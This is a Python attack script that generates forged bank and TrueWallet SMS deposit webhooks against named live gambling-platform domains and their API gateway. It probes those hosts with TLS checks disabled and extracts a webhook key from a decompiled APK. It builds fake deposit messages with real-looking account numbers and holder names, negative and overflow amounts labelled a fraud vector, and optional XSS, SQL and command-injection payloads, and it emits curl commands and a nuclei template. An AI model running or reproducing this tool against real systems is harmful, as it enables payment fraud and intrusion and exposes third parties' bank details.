#!/usr/bin/env python3
"""
payloads.py — Luxino / ztechdev webhook injection payload generator
Scope: bot-auto.ztechdev.com + all in-scope platform domains (authorized — scope.json)

Usage:
    uv run payloads.py              # generate all payloads, print summary
    uv run payloads.py --json       # dump full payload set as JSON
    uv run payloads.py --curl       # print curl one-liners
    uv run payloads.py --nuclei     # write nuclei YAML template
    uv run payloads.py --out FILE   # save JSON to file
    uv run payloads.py --scan       # probe all platform domains, print live hosts
    uv run payloads.py --scan --curl  # scan then emit curl for first live host
"""
import json
import sys
import time
import socket
import argparse
import re
import urllib.request
import urllib.error
import ssl
from pathlib import Path
from datetime import datetime, timezone

# ── Target config (overridden by --domain at runtime) ─────────────────────
C2_BASE = "https://bot-auto.ztechdev.com"
# Live API gateway (we88c.com / TID 54ef7626)
API_GATEWAY = "https://54ef7626cb381f4bab8be91f0cdbce47mgapi.asdgapicenterssdo.com"
API_ENDPOINTS = {
    "users":            "/mb/users",
    "wallet":           "/mb/wallet",
    "payment_info":     "/mb/payment-bank-information",
    "slip_check":       "/mb/auto-slip-deposit/check",
}
ENDPOINTS = {
    "truewallet": "/webhooks/sms/truewallet",
    "kbank":      "/webhook-kbank",
    "scb":        "/webhook-scb",
    "bbl":        "/webhook-bbl",
    "ktb":        "/webhook-ktb",
    "sms":        "/webhook-sms",
}

# ── Target accounts (from platform deposit page) ─────────────────────────────
TARGET_USERNAME   = "0811111111"
TW_SENDER         = "0962850415"   # TrueWallet depositor phone
# BBL depositor account (sender side)
BBL_BANK_NO       = "303-715007-9"
BBL_ACCT_NAME     = "วัชชิระ หม่องภิชัย"
# KTB operator/company account (receiver — BBL→KTB flow)
KTB_BANK_NO       = "017-072964-8"
KTB_ACCT_NAME     = "บริษัท เจ พี เฟรช จำกัด"
# Default
TARGET_BANK_NO    = BBL_BANK_NO
TARGET_ACCT_NAME  = BBL_ACCT_NAME

BANKS = {
    "KBANK": {
        "address": "KBank",
        "messages": [
            "รับเงิน {amount} บาท จาก พร้อมเพย์",
            "โอนเงิน {amount} บาท เข้าบัญชี",
            "ได้รับเงิน {amount} บาท",
        ],
    },
    "SCB": {
        "address": "SCB",
        "messages": [
            "ได้รับเงินโอน {amount} บาท",
            "โอนเงิน {amount} บาท สำเร็จ",
        ],
    },
    "KTB": {
        "address": "Krungthai NEXT",
        "messages": [
            "รับเงิน {amount} บาท บัญชี {acct}",
            "โอนเงินสำเร็จ {amount} บาท เข้าบัญชี {acct} {name}",
        ],
    },
    "BBL": {
        "address": "Bualuang mBanking",
        "messages": [
            "โอนเงิน {amount} บาท ไปบัญชี KTB {ktb_acct} {ktb_name} สำเร็จ",
            "BBL ยืนยันโอนเงิน {amount} บาท ปลายทาง {ktb_acct}",
            "ธนาคารกรุงเทพ โอนสำเร็จ {amount} บาท เข้า {ktb_name}",
        ],
    },
    "TRUEMONEY": {
        "address": "TrueMove H",
        "messages": [
            "รับโอนเงิน TrueMoney Wallet {amount} บาท จาก {tw_sender}",
            "TrueMoney: รับเงิน {amount} บาท จากเบอร์ {tw_sender}",
        ],
    },
}

# ── Amount variants ────────────────────────────────────────────────────────
AMOUNT_VARIANTS = [
    ("normal",    "100.00"),
    ("zero",      "0.00"),
    ("negative",  "-100.00"),
    ("overflow",  "999999999.99"),
    ("sci",       "1e2"),
    ("string",    "one hundred"),
    ("null",      "null"),
    ("empty",     ""),
    ("float_str", "100,00"),
    ("unicode",   "๑๐๐.๐๐"),
    ("space",     " 100.00 "),
]

# ── Generic vuln-class payload library ────────────────────────────────────
PAYLOADS_JSON = Path("/home/kzp/claude-red/nuxt/payloads.json")


def load_vuln_payloads(vuln_class: str | None = None) -> dict:
    if not PAYLOADS_JSON.exists():
        return {}
    data = json.loads(PAYLOADS_JSON.read_text())
    if vuln_class:
        return {vuln_class: data[vuln_class]} if vuln_class in data else {}
    return data


def build_vuln_payloads(vuln_class: str | None = None) -> list[dict]:
    """Inject vuln-class payloads into webhook message/address/smsid fields."""
    vuln_data = load_vuln_payloads(vuln_class)
    if not vuln_data:
        return []

    result = []
    ts_base = int(time.time() * 1000)
    static_key = get_static_key()

    for cls, variants in vuln_data.items():
        if isinstance(variants, dict):
            items = list(variants.items())
        elif isinstance(variants, list):
            items = [(f"{cls}_{i}", v) for i, v in enumerate(variants)]
        else:
            continue

        for name, payload in items:
            payload_str = payload if isinstance(payload, str) else json.dumps(payload)
            ts = ts_base + len(result)

            for field in ("message", "address", "smsid"):
                body = {
                    "address":   "Bualuang mBanking",
                    "message":   f"ธนาคารกรุงเทพ รับโอนเงิน 100.00 บาท บัญชี {TARGET_BANK_NO}",
                    "timestamp": ts,
                    "bank_no":   TARGET_BANK_NO,
                    "acct_name": TARGET_ACCT_NAME,
                    "smsid":     f"SMS_VULN_{ts}",
                    "type":      "deposit",
                    "bank_code": "BBL",
                    "username":  TARGET_USERNAME,
                    "password":  "1234",
                    "amount":    "100.00",
                }
                body[field] = payload_str

                result.append({
                    "id":          f"VULN_{cls}_{name}_{field}_{len(result):04d}",
                    "bank":        "KBANK",
                    "amount_type": "normal",
                    "vuln_class":  cls,
                    "variant":     name,
                    "inject_field": field,
                    "endpoint":    ENDPOINTS["kbank"],
                    "url":         C2_BASE + ENDPOINTS["kbank"],
                    "headers": {
                        "Content-Type": "application/json",
                        **({"PAPDIEAW-KEY": static_key} if static_key else {}),
                    },
                    "body": body,
                    "note": f"{cls}_{name} injected into {field}",
                })

    return result


# ── In-scope platform + tenant domains ────────────────────────────────────
SCAN_TARGETS = [
    "bot-auto.ztechdev.com",
    "ztechdev.com",
    "luxino.com",
    "bot.luxino.com",
    "bot-auto.luxino.com",
    "staging-bot.luxino.com",
    "vak88z3.com",
    "we88z.plus",
    "we88c.com",
    "asdgapicenterssdo.com",
    "54ef7626cb381f4bab8be91f0cdbce47mgapi.asdgapicenterssdo.com",  # live gateway (we88c.com)
    "api.asdgapicenterssdo.com",
    "sms.asdgapicenterssdo.com",
    "deposit.asdgapicenterssdo.com",
    "gateway.asdgapicenterssdo.com",
    "we88zz.appspot.com",
]

PROBE_PATHS = [
    "/public-health-check",
    "/",
    "/api",
    "/service/authenticate",
    "/webhooks/sms/truewallet",
    "/webhook-kbank",
    "/webhook-scb",
    "/webhook-sms",
    "/service/deposit/get-endpoint-webhook",
]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def _http_get(url: str, timeout: int = 5) -> tuple[int, str]:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            body = r.read(512).decode("utf-8", errors="replace")
            return r.status, body
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


def _resolve(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except Exception:
        return ""


def scan_domains(verbose: bool = False) -> list[dict]:
    """Probe all in-scope domains. Returns list of live host records."""
    print(f"{'─'*64}")
    print(f"  {'HTTP':<6} {'IP':<16} {'DOMAIN'}")
    print(f"{'─'*64}")

    live = []
    for host in SCAN_TARGETS:
        ip = _resolve(host)
        code, snippet = _http_get(f"https://{host}/")
        status_str = str(code) if code else "000"
        marker = "●" if code and 200 <= code < 400 else " "
        print(f"{marker} {status_str:<6} {ip or 'no-dns':<16} {host}")

        if code and code != 521:
            rec = {"host": host, "ip": ip, "root_code": code, "paths": {}}
            if verbose and code not in (0,):
                for path in PROBE_PATHS:
                    pc, ps = _http_get(f"https://{host}{path}")
                    rec["paths"][path] = pc
                    if pc:
                        print(f"         {pc}  {path}")
                time.sleep(0.1)
            live.append(rec)

    print(f"{'─'*64}")
    print(f"Live hosts: {len(live)}")
    return live


# ── Static webhook key extraction ──────────────────────────────────────────
def get_static_key() -> str:
    candidates = [
        Path("nuxt/data/apk/jadx_out_all/LuxSms-v3/sources/com/example/appsms/api/ListApi.java"),
        Path.home() / "claude-red/nuxt/data/apk/jadx_out_all/LuxSms-v3/sources/com/example/appsms/api/ListApi.java",
        Path("/home/kzp/claude-red/nuxt/data/apk/jadx_out_all/LuxSms-v3/sources/com/example/appsms/api/ListApi.java"),
    ]
    for p in candidates:
        if p.exists():
            m = re.search(r'PAPDIEAW-KEY[:\s"]+([0-9a-fA-F]{64})', p.read_text())
            if m:
                return m.group(1)
    import os
    return os.environ.get("PAPDIEAW_KEY", "")


# ── Payload builder ────────────────────────────────────────────────────────
def build_payloads() -> list[dict]:
    payloads = []
    ts_base = int(time.time() * 1000)
    static_key = get_static_key()

    for bank_code, bank_info in BANKS.items():
        for msg_tmpl in bank_info["messages"]:
            for amount_label, amount_val in AMOUNT_VARIANTS:
                ts = ts_base + len(payloads)

                ep_key = "truewallet" if bank_code == "TRUEMONEY" else \
                         "kbank" if bank_code == "KBANK" else \
                         "scb"   if bank_code == "SCB"   else \
                         "bbl"   if bank_code == "BBL"   else \
                         "ktb"   if bank_code == "KTB"   else "sms"

                # Per-bank account routing
                acct_no   = KTB_BANK_NO   if bank_code == "KTB" else TARGET_BANK_NO
                acct_name = KTB_ACCT_NAME if bank_code == "KTB" else TARGET_ACCT_NAME

                msg = msg_tmpl.format(
                    amount=amount_val,
                    acct=acct_no,
                    name=acct_name,
                    ktb_acct=KTB_BANK_NO,
                    ktb_name=KTB_ACCT_NAME,
                    tw_sender=TW_SENDER,
                )

                body = {
                    "address":    bank_info["address"],
                    "message":    msg,
                    "timestamp":  ts,
                    "bank_no":    acct_no,
                    "acct_name":  acct_name,
                    "smsid":      f"SMS_PROBE_{ts}",
                    "type":       "deposit",
                    "bank_code":  bank_code,
                    "username":   TARGET_USERNAME,
                    "password":   "1234",
                    "amount":     amount_val,
                }
                # TrueWallet: sender = depositor phone, receiver = operator wallet
                if bank_code == "TRUEMONEY":
                    body["sender"]   = TARGET_USERNAME   # 0811111111 (depositor)
                    body["receiver"] = TW_SENDER         # 0962850415 (operator wallet)

                payloads.append({
                    "id":          f"{bank_code}_{amount_label}_{len(payloads):04d}",
                    "bank":        bank_code,
                    "amount_type": amount_label,
                    "endpoint":    ENDPOINTS[ep_key],
                    "url":         C2_BASE + ENDPOINTS[ep_key],
                    "headers": {
                        "Content-Type": "application/json",
                        **({"PAPDIEAW-KEY": static_key} if static_key and ep_key == "truewallet" else {}),
                    },
                    "body": body,
                    "note": (
                        "unauthenticated_bypass_test" if not static_key and ep_key == "truewallet" else
                        "static_key_injection" if static_key and ep_key == "truewallet" else
                        "no_auth_required"
                    ),
                })

    # Extra: negative-amount across all endpoints
    for ep_key, ep_path in ENDPOINTS.items():
        payloads.append({
            "id":          f"NEGAMT_{ep_key}_extra",
            "bank":        "BBL",
            "amount_type": "negative_special",
            "endpoint":    ep_path,
            "url":         C2_BASE + ep_path,
            "headers":     {"Content-Type": "application/json"},
            "body": {
                "address":   "Bualuang mBanking",
                "message":   f"ธนาคารกรุงเทพ รับโอนเงิน -99999.00 บาท บัญชี {TARGET_BANK_NO} {TARGET_ACCT_NAME}",
                "timestamp": ts_base,
                "bank_no":   TARGET_BANK_NO,
                "acct_name": TARGET_ACCT_NAME,
                "smsid":     f"SMS_NEG_{ts_base}",
                "type":      "deposit",
                "bank_code": "BBL",
                "username":  TARGET_USERNAME,
                "password":  "1234",
                "amount":    "-99999.00",
            },
            "note": "negative_amount_fraud_vector",
        })

    return payloads


# ── Output formatters ──────────────────────────────────────────────────────
def fmt_curl(p: dict) -> str:
    hdr = " ".join(f'-H "{k}: {v}"' for k, v in p["headers"].items())
    body = json.dumps(p["body"], ensure_ascii=False)
    return (
        f"# [{p['id']}] {p['note']}\n"
        f"curl -sk -X POST '{p['url']}' {hdr} "
        f"-d '{body}' -w '\\nHTTP:%{{http_code}}\\n'"
    )


def write_nuclei(payloads: list[dict], out: Path):
    by_ep: dict[str, list] = {}
    for p in payloads:
        by_ep.setdefault(p["endpoint"], []).append(p)

    lines = [
        "id: luxino-webhook-injection",
        "",
        "info:",
        "  name: Luxino SMS Webhook Injection — Full Variant Suite",
        "  author: pentest",
        "  severity: high",
        "  tags: webhook,injection,gambling,sms",
        "",
        "http:",
    ]

    for ep, eps in by_ep.items():
        sample = eps[0]
        lines += [
            "  - raw:",
            "      - |",
            f"        POST {{{{endpoint}}}}{ep} HTTP/1.1",
            "        Host: {{Hostname}}",
            "        Content-Type: application/json",
        ]
        if "PAPDIEAW-KEY" in sample["headers"]:
            lines.append("        PAPDIEAW-KEY: {{papdieaw_key}}")
        lines += [
            "",
            "        {{payload}}",
            "",
            "    payloads:",
            "      endpoint:",
            f"        - {C2_BASE}",
            "      payload:",
        ]
        for p in eps[:10]:
            lines.append(f"        - '{json.dumps(p['body'], ensure_ascii=False)}'")
        lines += [
            "",
            "    matchers-condition: or",
            "    matchers:",
            "      - type: status",
            "        status: [200, 201]",
            "      - type: word",
            "        words: ['success', 'accepted', 'processed', 'ok']",
            "",
        ]

    out.write_text("\n".join(lines))
    print(f"Nuclei template → {out}")


# ── Main ───────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--json",    action="store_true", help="Dump payload set as JSON")
    ap.add_argument("--curl",    action="store_true", help="Print curl one-liners")
    ap.add_argument("--nuclei",  action="store_true", help="Write nuclei YAML to lux_nuclei_webhook.yaml")
    ap.add_argument("--out",     metavar="FILE",       help="Save JSON to file")
    ap.add_argument("--filter",  metavar="BANK",       help="Filter by bank (KBANK/SCB/KTB/TRUEMONEY)")
    ap.add_argument("--amount",  metavar="TYPE",       help="Filter by amount variant")
    ap.add_argument("--scan",    action="store_true", help="Probe all in-scope platform domains")
    ap.add_argument("--verbose", action="store_true", help="With --scan: probe all paths on each live host")
    ap.add_argument("--host",    metavar="HOST",       help="Override C2_BASE host for payload generation")
    ap.add_argument("--vuln",      metavar="CLASS",    help="Include vuln-class payloads (xss/sqli/cmdi/ssrf/lfi/xxe/jwt/proto/ssti/deser/all)")
    ap.add_argument("--domain",    metavar="DOMAIN",   help="Target platform domain key: vak88z / we88zz / luxino (default: vak88z)")
    ap.add_argument("--jwt",       metavar="TOKEN",    help="Bearer JWT for API gateway probes (or set JWT env var)")
    ap.add_argument("--api-probe", action="store_true",help="Probe live API gateway (requires --jwt / JWT env)")
    args = ap.parse_args()

    global C2_BASE, TARGET_USERNAME, TARGET_BANK_NO, TARGET_ACCT_NAME, BBL_BANK_NO, BBL_ACCT_NAME, KTB_BANK_NO, KTB_ACCT_NAME, TW_SENDER

    # Load per-domain config
    if args.domain:
        try:
            from domains import get_domain
            dcfg = get_domain(args.domain)
            C2_BASE          = dcfg["c2_base"]
            TARGET_USERNAME  = dcfg["username"]
            TW_SENDER        = dcfg["tw_receiver"]
            accts            = dcfg.get("accounts", {})
            if "BBL" in accts:
                BBL_BANK_NO   = accts["BBL"]["no"]
                BBL_ACCT_NAME = accts["BBL"]["name"]
                TARGET_BANK_NO   = BBL_BANK_NO
                TARGET_ACCT_NAME = BBL_ACCT_NAME
            if "KBANK" in accts:
                # KBANK acts as primary account for we88zz platform
                BBL_BANK_NO   = accts["KBANK"]["no"]
                BBL_ACCT_NAME = accts["KBANK"]["name"]
                TARGET_BANK_NO   = BBL_BANK_NO
                TARGET_ACCT_NAME = BBL_ACCT_NAME
            if "KTB" in accts:
                KTB_BANK_NO   = accts["KTB"]["no"]
                KTB_ACCT_NAME = accts["KTB"]["name"]
            print(f"Domain: {args.domain} → C2: {C2_BASE} | FB: {dcfg['fb_project']}")
        except (ImportError, KeyError) as e:
            print(f"[warn] --domain failed: {e} — using defaults")

    if args.host:
        C2_BASE = f"https://{args.host}" if not args.host.startswith("http") else args.host

    # JWT resolution
    import os as _os
    _jwt = getattr(args, 'jwt', None) or _os.environ.get("JWT") or _os.environ.get("WE88_JWT", "")

    if getattr(args, 'api_probe', False):
        import subprocess, sys as _sys
        probe_script = Path(__file__).parent / "api_probe.py"
        if probe_script.exists():
            env = {**_os.environ, "PYTHONPATH": str(Path(__file__).parent)}
            if _jwt:
                env["JWT"] = _jwt
            subprocess.run([_sys.executable, str(probe_script)], env=env)
        else:
            print(f"api_probe.py not found — run it directly from the worktree")
        return

    if args.scan:
        live = scan_domains(verbose=args.verbose)
        if live and not (args.curl or args.json or args.nuclei or args.out):
            return
        if live:
            # Auto-retarget to first live non-original host if C2_BASE is still down
            first = live[0]["host"]
            if C2_BASE == "https://bot-auto.ztechdev.com":
                C2_BASE = f"https://{first}"
                print(f"\nAuto-retargeted → {C2_BASE}")
        elif not live:
            print("No live hosts found — exiting")
            return

    payloads = build_payloads()

    if args.vuln:
        vc = None if args.vuln == "all" else args.vuln
        vuln_payloads = build_vuln_payloads(vc)
        payloads = payloads + vuln_payloads
        print(f"Vuln-class payloads appended: {len(vuln_payloads)} ({args.vuln})")

    if args.filter:
        payloads = [p for p in payloads if p["bank"] == args.filter.upper()]
    if args.amount:
        payloads = [p for p in payloads if p["amount_type"] == args.amount]

    key_found = bool(get_static_key())

    if args.json or args.out:
        data = {
            "generated":        datetime.now(timezone.utc).isoformat(),
            "target":           C2_BASE,
            "static_key_found": key_found,
            "count":            len(payloads),
            "payloads":         payloads,
        }
        if args.out:
            Path(args.out).write_text(json.dumps(data, indent=2, ensure_ascii=False))
            print(f"Saved {len(payloads)} payloads → {args.out}")
        else:
            print(json.dumps(data, indent=2, ensure_ascii=False))
        return

    if args.curl:
        for p in payloads:
            print(fmt_curl(p))
            print()
        return

    if args.nuclei:
        write_nuclei(payloads, Path("lux_nuclei_webhook.yaml"))
        return

    # Default: summary
    by_ep: dict[str, int] = {}
    by_bank: dict[str, int] = {}
    for p in payloads:
        by_ep[p["endpoint"]] = by_ep.get(p["endpoint"], 0) + 1
        by_bank[p["bank"]] = by_bank.get(p["bank"], 0) + 1

    print(f"Luxino webhook payload generator — {datetime.now(timezone.utc).date()}")
    print(f"Target  : {C2_BASE}")
    print(f"Key     : {'✓ found (PAPDIEAW-KEY extracted)' if key_found else '✗ not found — set PAPDIEAW_KEY env var'}")
    print(f"Payloads: {len(payloads)}")
    print()
    print("By endpoint:")
    for ep, n in sorted(by_ep.items()):
        print(f"  {ep:<38} {n:>3}")
    print()
    print("By bank:")
    for bank, n in sorted(by_bank.items()):
        print(f"  {bank:<14} {n:>3}")
    print()
    print("Run with:")
    print("  uv run payloads.py --scan             # probe all platform domains")
    print("  uv run payloads.py --scan --verbose   # scan + path-probe each live host")
    print("  uv run payloads.py --scan --curl      # scan then emit curl for live host")
    print("  uv run payloads.py --host HOST --curl # target a specific host")
    print("  uv run payloads.py --curl             # curl one-liners (current C2_BASE)")
    print("  uv run payloads.py --nuclei           # nuclei YAML template")
    print("  uv run payloads.py --out payloads.json")
    print("  uv run payloads.py --filter KBANK --amount negative")
    print("  uv run payloads.py --vuln xss --curl   # inject XSS into message/address/smsid")
    print("  uv run payloads.py --vuln all --json    # full vuln-class suite")
    print(f"  (vuln library: {PAYLOADS_JSON} — {'found' if PAYLOADS_JSON.exists() else 'NOT FOUND'})")


if __name__ == "__main__":
    main()
